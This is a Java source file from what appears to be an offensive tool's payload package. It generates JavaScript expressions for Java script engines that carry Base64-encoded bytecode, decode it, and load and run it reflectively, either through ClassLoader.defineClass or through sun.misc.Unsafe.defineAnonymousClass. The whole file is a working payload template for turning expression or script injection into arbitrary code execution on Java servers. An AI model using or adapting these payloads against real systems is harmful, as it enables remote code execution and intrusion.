package cn.butler.thirdparty.payloads.expression;

import java.util.Base64;

/**
 * ScriptEngineManager(JS)类加载模板
 */
public class JSExpression{
    public static String commonExpressModify(byte[] byteCode){
        String jsExpression = "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
            "var clsString = classLoader.loadClass('java.lang.String');" +
            "var bytecodeBase64 = '"+ Base64.getEncoder().encodeToString(byteCode) +"';" +
            "var bytecode;" +
            "try{" +
            "    var clsBase64 = classLoader.loadClass('java.util.Base64');" +
            "    var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');" +
            "    var decoder = clsBase64.getMethod('getDecoder').invoke(clsBase64);" +
            "    bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);" +
            "} catch (ee) {" +
            "    try {" +
            "        var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');" +
            "        bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);" +
            "    } catch (eee) {" +
            "        var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');" +
            "        bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);" +
            "    }" +
            "}" +
            "var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');" +
            "var clsByteArray = (new java.lang.String('a').getBytes().getClass());" +
            "var clsInt = java.lang.Integer.TYPE;" +
            "var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);" +
            "defineClass.setAccessible(true);" +
            "var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));" +
            "clazz.newInstance();";
        return jsExpression;
    }

    public static String unsafeExpressModify(byte[] byteCode){
        String jsExpression = "var s = '"+ Base64.getEncoder().encodeToString(byteCode) +"';" +
            "var bt;" +
            "try {" +
            "    bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
            "} catch(e) {" +
            "    bt = java.util.Base64.getDecoder().decode(s);" +
            "}" +
            "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
            "theUnsafeField.setAccessible(true);" +
            "unsafe = theUnsafeField.get(null);" +
            "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";
        return jsExpression;
    }
}
